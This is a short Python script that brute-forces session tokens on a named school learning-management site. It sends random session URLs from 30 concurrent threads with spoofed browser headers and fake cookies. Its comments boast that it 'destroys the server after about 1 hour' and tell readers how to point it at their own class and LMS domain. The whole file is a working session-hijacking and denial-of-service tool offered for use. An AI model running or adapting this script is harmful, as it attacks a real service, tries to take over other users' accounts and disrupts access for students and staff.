import random
import string
import requests
import logging
import concurrent.futures
import time


# this code has near 0% chance of finding cookie to login but it destorys the server after about 1 hour of running!!!
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


def generate_random_string(length=16):
    chars = string.ascii_lowercase + string.digits  # Lowercase letters and digits
    random_part = "".join(random.choices(chars, k=length))
    return f"https://vsch.rouzbeh.info/r0001fiz12b/?session=breezbreez{random_part}&proto=true"
    # replace r0001fiz12b with your class id and vsch.rouzbeh.info to your LMS domain lol


def get_new_session():
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": random.choice(
                [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                ]
            ),
            "Referer": "https://google.com",
        }
    )
    session.cookies.set(
        "session_id",
        "".join(random.choices(string.ascii_letters + string.digits, k=16)),
    )
    return session


def check_url(url):
    session = get_new_session()
    logging.info(f"Checking URL: {url}")
    try:
        response = session.get(url, timeout=5)
        if "Where" in response.text:
            logging.warning(f"ANSWER WAS FOUND OMG LOL! {url}")
            print(url)
            return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed: {e}")
    return False


def check_guest_in_html():
    # more workers = more lag on the class = getting blocked
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        while True:
            urls = [generate_random_string() for _ in range(30)]
            results = executor.map(check_url, urls)
            if any(results):
                break
            time.sleep(0.1)  # delay to avoid getting blocked, can change it if u like


check_guest_in_html()
